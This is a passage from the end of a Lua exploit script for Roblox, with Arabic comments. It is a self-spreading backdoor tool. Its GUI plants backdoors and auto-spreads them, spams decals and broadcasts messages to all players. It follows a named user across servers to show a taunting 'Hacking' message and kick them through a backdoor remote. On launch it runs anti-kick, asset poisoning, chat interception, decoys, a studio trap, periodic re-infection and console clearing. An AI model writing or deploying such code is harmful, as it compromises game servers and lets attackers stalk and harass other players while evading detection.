        {name = "Auto", cmd = "auto"},
        {name = "Plant", cmd = "plant"},
        {name = "Decal", cmd = "decalspam"},
        {name = "List", cmd = "list"},
    }

    for _, cmdInfo in ipairs(commands) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 88, 0, 34)
        btn.BackgroundColor3 = Color3.fromRGB(170, 40, 40)
        btn.Text = cmdInfo.name
        btn.TextColor3 = Color3.fromRGB(255,255,255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 13
        btn.Parent = buttonContainer
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        btn.MouseButton1Click:Connect(function()
            statusLabel.Text = "تنفيذ: " .. cmdInfo.name
            if cmdInfo.cmd == "plant" then
                local success = PlantBackdoor()
                if success then
                    infectionActive = true
                    statusLabel.Text = "تم زرع الباب الخلفي!"
                else
                    statusLabel.Text = "فشل الزرع!"
                end
            elseif cmdInfo.cmd == "universe" then
                autoSpreadEnabled = true
                task.spawn(UniversalSpread)
                statusLabel.Text = "بدء الانتشار الشامل..."
            elseif cmdInfo.cmd == "auto" then
                autoSpreadEnabled = not autoSpreadEnabled
                statusLabel.Text = "الانتشار التلقائي: " .. (autoSpreadEnabled and "ON" or "OFF")
            else
                task.spawn(executeCommand, cmdInfo.cmd)
                statusLabel.Text = "تم: " .. cmdInfo.name
            end
        end)
    end

    -- مربع رسالة مخصصة
    local msgFrame = Instance.new("Frame")
    msgFrame.Size = UDim2.new(1, -10, 0, 36)
    msgFrame.BackgroundTransparency = 1
    msgFrame.Parent = buttonContainer
    msgFrame.LayoutOrder = 998

    local msgInput = Instance.new("TextBox")
    msgInput.Size = UDim2.new(1, -60, 0, 34)
    msgInput.BackgroundColor3 = Color3.fromRGB(40,40,60)
    msgInput.PlaceholderText = "رسالة مخصصة..."
    msgInput.TextColor3 = Color3.fromRGB(255,255,255)
    msgInput.Font = Enum.Font.GothamMedium
    msgInput.TextSize = 12
    msgInput.Parent = msgFrame

    local sendMsgBtn = Instance.new("TextButton")
    sendMsgBtn.Size = UDim2.new(0, 55, 0, 34)
    sendMsgBtn.Position = UDim2.new(1, -55, 0, 0)
    sendMsgBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
    sendMsgBtn.Text = "إرسال"
    sendMsgBtn.TextColor3 = Color3.fromRGB(255,255,255)
    sendMsgBtn.Font = Enum.Font.GothamBold
    sendMsgBtn.TextSize = 12
    sendMsgBtn.Parent = msgFrame
    sendMsgBtn.MouseButton1Click:Connect(function()
        local txt = msgInput.Text
        if txt ~= "" then sendGlobalMessageToAllPlayers(txt); msgInput.Text = ""; statusLabel.Text = "تم الإرسال" end
    end)

    -- واجهة تتبع الهدف
    local targetFrame = Instance.new("Frame")
    targetFrame.Size = UDim2.new(1, -10, 0, 44)
    targetFrame.Position = UDim2.new(0, 5, 0, 40)
    targetFrame.BackgroundColor3 = Color3.fromRGB(25,25,45)
    targetFrame.BorderSizePixel = 0
    targetFrame.Parent = frame

    local targetLabel = Instance.new("TextLabel")
    targetLabel.Size = UDim2.new(0, 60, 1, 0)
    targetLabel.BackgroundTransparency = 1
    targetLabel.Text = "Target:"
    targetLabel.TextColor3 = Color3.fromRGB(200,200,200)
    targetLabel.Font = Enum.Font.GothamMedium
    targetLabel.TextSize = 12
    targetLabel.Parent = targetFrame

    local targetInput = Instance.new("TextBox")
    targetInput.Size = UDim2.new(1, -125, 0, 34)
    targetInput.Position = UDim2.new(0, 65, 0, 5)
    targetInput.BackgroundColor3 = Color3.fromRGB(40,40,60)
    targetInput.PlaceholderText = "Username..."
    targetInput.TextColor3 = Color3.fromRGB(255,255,255)
    targetInput.Font = Enum.Font.GothamMedium
    targetInput.TextSize = 12
    targetInput.Parent = targetFrame

    local targetBtn = Instance.new("TextButton")
    targetBtn.Size = UDim2.new(0, 55, 0, 34)
    targetBtn.Position = UDim2.new(1, -55, 0, 5)
    targetBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 0)
    targetBtn.Text = "Follow"
    targetBtn.TextColor3 = Color3.fromRGB(255,255,255)
    targetBtn.Font = Enum.Font.GothamBold
    targetBtn.TextSize = 11
    targetBtn.Parent = targetFrame

    local following = false
    targetBtn.MouseButton1Click:Connect(function()
        if following then return end
        local targetName = targetInput.Text
        if targetName == "" then return end
        local success, userId = pcall(Players.GetUserIdFromNameAsync, Players, targetName)
        if not success or not userId then return end
        following = true
        statusLabel.Text = "Following " .. targetName
        targetBtn.Text = "Stop"
        targetBtn.BackgroundColor3 = Color3.fromRGB(100,100,100)

        task.spawn(function()
            while following do
                local ok, placeId, instanceId = pcall(TeleportService.GetPlayerPlaceInstanceAsync, TeleportService, userId)
                if ok and placeId then
                    if placeId ~= game.PlaceId or instanceId ~= game.JobId then
                        pcall(TeleportService.TeleportToPlaceInstance, TeleportService, placeId, instanceId, LocalPlayer)
                        task.wait(5)
                        local backdoorRemote = ReplicatedStorage:FindFirstChild("OmegaTargetUI")
                        if backdoorRemote then
                            local targetPlayer = Players:FindFirstChild(targetName)
                            if targetPlayer then
                                backdoorRemote:FireServer("showgui", targetPlayer, "you'are Hacking by 109er_0\nHAHAHAHAHAHAHAHA")
                                task.wait(1)
                                backdoorRemote:FireServer("kick", targetPlayer)
                                following = false
                                statusLabel.Text = "Target kicked and logged."
                                targetBtn.Text = "Follow"
                                targetBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 0)
                                break
                            end
                        end
                    end
                end
                task.wait(5)
            end
        end)
    end)

    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40)
    end)
    return true
end

-- =============================[ الانتشار البطيء التلقائي ]=============================
local function startSlowBurn()
    task.spawn(function()
        while true do
            task.wait(spreadInterval)
            if autoSpreadEnabled then autoSpreadTrigger() end
        end
    end)
end

-- =============================[ الإطلاق الرئيسي ]=============================
local function Launch()
    AntiKick()
    pcall(function()
        setupStudioTrap(script)
        createDecoy()
        setupFragments()
    end)
    poisonAssets()
    ChatIntercept()
    CreateMenuGUI()
    startSlowBurn()
    task.spawn(startCommandListener)
    task.spawn(function()
        while true do
            task.wait(120)
            if not sleepModeActive and not infectionActive then
                infectionActive = PlantBackdoor()
            end
            ClearConsole()
        end
    end)
    -- تفعيل جميع الصفات التسع
    UnboundedAI:AutoKill()
    Predictive:PreemptDefense()
    -- PDoS لا يتم تفعيله تلقائياً، يمكن استدعاؤه عبر أمر
    print("💀 OMEGA PHANTOM | POLYMORPHIC ULTIMATE — ALL 9 TRAITS ACTIVE 💀")
end
Launch()
